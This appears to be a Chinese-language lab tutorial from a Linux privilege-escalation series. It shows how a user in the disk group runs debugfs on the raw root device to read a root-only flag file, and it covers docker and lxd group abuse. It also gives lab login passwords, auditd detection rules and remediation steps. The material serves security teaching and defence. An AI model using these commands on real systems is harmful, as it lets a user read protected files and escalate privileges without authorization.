# Day 12：你真的只是普通使用者嗎？Dangerous Group 背後的權限

## 開場情境

我是 `fei-student`。沒有 sudo、沒有 SUID、沒有 Capability、沒有 Cron、沒有暴露的 Credential。

但我執行 `id` 的時候，看到一個不太起眼的東西：

```
groups=1001(fei-student),6(disk)
```

`disk`？那是什麼？我只是想存檔案，為什麼要在 disk group？

答案是：**disk group 可能讓你繞過整個 filesystem 的權限檢查。**

---

## 今天要解決的問題

1. Linux Group Membership 本身是不是一種「權限」？
2. 哪些 group 看起來無害但其實很危險？
3. `disk` group 到底允許做什麼？
4. Filesystem Permission 和 Raw Device Access 的差異是什麼？

---

## 背景知識：Linux Group Authorization

Linux 的存取控制基於三個層級：

```
User（UID）→ 檔案 owner 權限
Group（GID）→ 檔案 group 權限
Other → 其他人的權限
```

但「Group」不只用在檔案。Linux 用 group 控制很多系統資源的存取：

```
/dev/sda  → disk group 可讀寫 raw disk
/dev/kvm  → kvm group 可使用虛擬化
/var/run/docker.sock → docker group 可控制 Docker daemon
```

### Primary Group vs Supplementary Group

```bash
id fei-student
# uid=1001(fei-student) gid=1001(fei-student) groups=1001(fei-student),6(disk)
#                       ^^^^^^^^^^^^^^^^^^^    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                       Primary Group          Supplementary Groups
```

**Primary Group**：建立檔案時的預設 group owner。
**Supplementary Group**：額外授權，透過 `/etc/group` 設定。

> ⚠️ 重要：Group membership 改變後，需要**新的 login session** 才會生效。現有的 shell 不會自動取得新的 group token。

---

## OS 原理：Block Device 與 Filesystem 的關係

這是本題最重要的概念。

### Storage Stack

![Storage Stack](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day12-dangerous-group-diagram-01.png)




當你用 `cat /root/flag.txt`：
1. VFS 檢查你的 UID/GID 是否有權限讀取 → **被擋下**

當你用 `debugfs -R 'cat /root/flag.txt' /dev/dm-0`：
1. 直接存取 block device → 如果你有權限讀 `/dev/dm-0`
2. debugfs 在 **user space** 解析 ext4 filesystem 結構
3. **完全跳過 VFS 的 permission check**


---

## 🔬 FEI Lab 環境

```
VM:         FEI-PRIVESC-LINUX
OS:         Ubuntu 22.04.4 LTS
起始帳號:    fei-student（Standard User + disk group）
目標:       root
Flag:       /root/fei-l08-flag.txt
Scenario:   FEI-L08-DANGEROUS-GROUP
```



### 場景準備

`ash
# 1. 以 fei-labadmin 登入
ssh fei-labadmin@192.168.77.10
# 密碼：FEI-LabAdmin-2026!

# 2. 進入場景目錄並 setup
cd /opt/fei-privesc/scenarios/FEI-L08-DANGEROUS-GROUP
sudo ./fei-setup.sh

# 3. 確認場景就緒
sudo ./fei-verify.sh
# 應看到 L08-DANGEROUS-GROUP STATUS: READY

# 4. 切換到 fei-student
su - fei-student
# 密碼：FEI-Student-2026!
`

### 部署過程

`fei-setup.sh` 做了：

1. 偵測 root partition：`/dev/mapper/ubuntu--vg-ubuntu--lv`（LVM）
2. 建立 udev rule 讓 LVM device 歸屬 disk group
3. 將 fei-student 加入 disk group
4. 建立 flag
5. 標記 **RELOGIN REQUIRED**

Verify 17 項全部 PASS：

```
[PASS] disk group exists
[PASS] fei-student is configured as member of disk group
[PASS] root partition device exists (/dev/mapper/ubuntu--vg-ubuntu--lv)
[PASS] disk group has access to root device (/dev/dm-0 group=disk)
[PASS] debugfs available
```

---

## 完整攻擊流程（Actual Output）

### Step 1：確認身份和群組

```bash
fei-student@fei-privesc-linux:~$ id
uid=1001(fei-student) gid=1001(fei-student) groups=1001(fei-student),6(disk)
```

看到 `6(disk)`。

### Step 2：了解 disk group 的意義

![Raw Device 存取如何繞過檔案權限](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day12-dangerous-group-diagram-02.png)

```bash
fei-student@fei-privesc-linux:~$ ls -la /dev/dm-0
brw-rw---- 1 root disk 253, 0 ... /dev/dm-0
```

`root:disk`，mode `660`。disk group 成員可以讀寫這個 block device。

### Step 3：找到 root partition

```bash
fei-student@fei-privesc-linux:~$ df /
Filesystem                        1K-blocks    Used Available Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  19430032 7074952  11342756  39% /
```

root filesystem 在 `/dev/mapper/ubuntu--vg-ubuntu--lv`，是 LVM logical volume。

### Step 4：確認直接讀取被拒

```bash
fei-student@fei-privesc-linux:~$ cat /root/fei-l08-flag.txt
cat: /root/fei-l08-flag.txt: Permission denied
```

### Step 5：使用 debugfs 繞過 filesystem permission

```bash
fei-student@fei-privesc-linux:~$ debugfs -R 'cat /root/fei-l08-flag.txt' /dev/dm-0
debugfs 1.46.5 (30-Dec-2021)
FEI{LINUX_L08_DANGEROUS_GROUP_ROOT_ACCESS}
```

**成功。** debugfs 直接從 raw block device 讀取了 flag，完全繞過 VFS 的 permission check。

---

## Attack Path

![Dangerous Group Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day12-dangerous-group-diagram-03.png)



---

## Attack Reasoning

```
已知條件：
  fei-student 是 disk group 成員
  disk group 可存取 /dev/dm-0（root filesystem）

可控制的資源：
  可以讀取 raw block device

高權限資源的信任：
  filesystem 的所有檔案資料都存放在 block device 上

結論：
  raw device access 繞過 VFS permission
  = 可以讀取任何檔案
  = Privilege Escalation
```

---

## False Positive 分析

**「在某個 group 就一定能提權嗎？」**

不一定。要問：

| 群組 | 可存取的資源 | 能提權嗎？ |
|------|------------|----------|
| **disk** | raw block device | ✅ 高危 — 繞過 filesystem ACL |
| **docker** | Docker daemon socket | ✅ 高危 — 可以 mount host filesystem |
| **lxd** | LXD daemon | ✅ 高危 — privileged container |
| **adm** | 系統 log | ⚠️ 中 — 可能含 credential |
| **audio** | audio device | ❌ 低 — 通常不能提權 |
| **video** | framebuffer | ❌ 低 — 可以截圖但不能提權 |
| **cdrom** | CD/DVD | ❌ 低 |

判斷 Group 是否危險的 Checklist：

```
□ 該 group 可以存取什麼系統資源？
□ 該資源是否由 root 或 privileged process 擁有/管理？
□ 是否可以透過該資源影響 root 的行為？
□ 是否可以直接繞過 security boundary？
```

---

## Edge Case

### Docker Group vs Disk Group

| 面向 | Docker Group | Disk Group |
|------|-------------|-----------|
| 攻擊方式 | 建立特權 container, mount host / | 直接讀寫 raw device |
| 需要什麼 | Docker daemon 運行中 | debugfs 或 dd |
| 風險等級 | 高 | 高 |
| 常見程度 | 開發者環境常見 | 很少見（通常是設定錯誤） |

在 FEI Lab 中，Docker 未安裝，所以使用 disk group。

### LXD Group

與 Docker 類似，可以建立特權 container mount host filesystem。

### Session / Re-login 行為

![Session 與重新登入行為](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day12-dangerous-group-diagram-04.png)



這不是 Bug，是 Linux 的正常行為。Group token 在 login 時建立，不會在已存在的 session 中更新。

---

## Troubleshooting

### 1. `id` 沒有顯示 disk group

需要重新登入。`id` 顯示的是**當前 session 的 token**，不是 `/etc/group` 的設定。

### 2. debugfs 回報 "Permission denied"

確認 block device 的 group 是 `disk`：

```bash
ls -la /dev/dm-0
# 應該看到 root:disk
```

如果 group 不是 disk（例如在 LVM 環境），可能需要 udev rule。

### 3. 不知道 root partition 在哪

```bash
df /          # 看 Mounted on /
mount | grep " / "  # 確認 root mount point
```

---

## 防禦觀點

### Detect

```bash
# 找出 disk group 的成員
getent group disk
# disk:x:6:fei-student  ← 不應該有普通使用者

# 監控 debugfs 使用
# auditd rule:
-w /usr/sbin/debugfs -p x -k raw_disk_access
```

### Prevent

1. **不要把普通使用者加入 disk group**
2. **定期審計 supplementary group membership**
3. **如果需要特定 device 存取，使用 ACL 而非 group**
4. **監控 group membership 變更**

### Fix Verification

```bash
# 移除 group membership
sudo gpasswd -d fei-student disk

# 驗證（新 session）
id fei-student | grep disk
# 不應出現 disk

# 驗證 debugfs 失敗
debugfs -R 'cat /root/fei-l08-flag.txt' /dev/dm-0
# 應該 Permission denied
```

---

## Detection

| 活動 | 偵測方式 |
|------|---------|
| debugfs 執行 | auditd `-w /usr/sbin/debugfs -p x` |
| dd 讀取 block device | auditd 監控 `/dev/sd*`, `/dev/dm-*` 的 open |
| 異常 group membership | 定期比對 `/etc/group` baseline |
| 新帳號加入 disk group | `usermod`/`gpasswd` 的 auditd log |

---

## 深入一層：Filesystem Permission 不是 Storage 安全的唯一防線

很多人認為 `chmod 600` 就能保護檔案。但實際上：

```
chmod 600 /root/secret.txt
```

只保護了 VFS 層級的存取。如果攻擊者能存取 raw block device：

```
Storage Layer Stack:
Application → VFS → ext4 → Block → Device
                ↑
          只有這裡有 permission check
```

raw device access（disk group）跳過了 VFS，直接讀取 block layer 上的資料。

這也是為什麼**全磁碟加密（FDE）** 和 **SELinux/AppArmor** 是更深層的防禦：
- FDE：raw device 讀出來是加密的
- SELinux：即使有 device permission，MAC policy 仍可阻擋

---

## FEI Lab 工程筆記

### LVM Symlink 問題

FEI Lab 使用 LVM（Logical Volume Manager）。root partition 是：

```
/dev/mapper/ubuntu--vg-ubuntu--lv → /dev/dm-0 (symlink)
```

第一次測試時，verify 檢查 `/dev/mapper/ubuntu--vg-ubuntu--lv` 的 group — 但 symlink 永遠是 `root:root`（symlink 的 ownership 沒有意義）。

**修正**：verify 改用 `readlink -f` 解析 symlink，檢查實際 device `/dev/dm-0` 的 group。

### udev Rule

直接 `chgrp disk /dev/dm-0` 會被 udev 重設。必須建立持久化 udev rule：

```
/etc/udev/rules.d/99-fei-l08-disk.rules:
SUBSYSTEM=="block", KERNEL=="dm-*", GROUP="disk", MODE="0660"
```

然後 `udevadm trigger` 讓規則生效。Reset 時移除此 rule。

---

## Exercise

### 練習 1：Group 危險性評估

你在一台新機器上執行 `id`，看到：

```
uid=1000(webdev) gid=1000(webdev) groups=1000(webdev),27(sudo),999(docker),6(disk)
```

列出所有可能的提權路徑，並排序風險等級。

### 練習 2：如果沒有 debugfs

假設 disk group 可用，但系統上沒有安裝 debugfs。你還有什麼方式可以讀取 raw disk 上的檔案？

提示：`dd`, `strings`, `xxd`

---

## Quiz

**Q1：** 為什麼 `chmod 600 /root/secret.txt` 不能阻止 disk group 成員讀取這個檔案？

### 答案
`chmod` 只設定 VFS 層級的 permission。disk group 成員可以透過 raw device access（debugfs/dd）直接讀取 block device 上的資料，完全繞過 VFS 的 permission check。


**Q2：** Group membership 改變後，為什麼現有的 shell 看不到新的 group？

### 答案
Linux 的 group token 在 login 時建立。現有 session 的 token 不會自動更新。必須重新登入（logout → login）才會載入新的 supplementary group。



## 場景收尾

做完後記得 reset，避免影響下一題：

```bash
# 以 fei-labadmin 執行
ssh fei-labadmin@192.168.77.10
cd /opt/fei-privesc/scenarios/FEI-L08-DANGEROUS-GROUP
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 應看到 L08-DANGEROUS-GROUP STATUS: RESET
```

---

## 今天真正要記住的 3 件事

1. **Group Membership 本身就是權限**——某些 group（disk/docker/lxd）可以直接繞過 Security Boundary
2. **Filesystem Permission 不是唯一防線**——raw device access 繞過 VFS 的所有 permission check
3. **新 group 需要新 session**——已存在的 shell 不會自動取得新的 group token

---

## 給自己的問題

> 如果 group 可以繞過 filesystem permission，那 systemd service 的設定呢？它的 Unit File 受 filesystem permission 保護，但如果它的 drop-in 目錄可寫呢？

---

## 下一篇

Day 13：systemd：高權限 Service 信任了誰的設定？
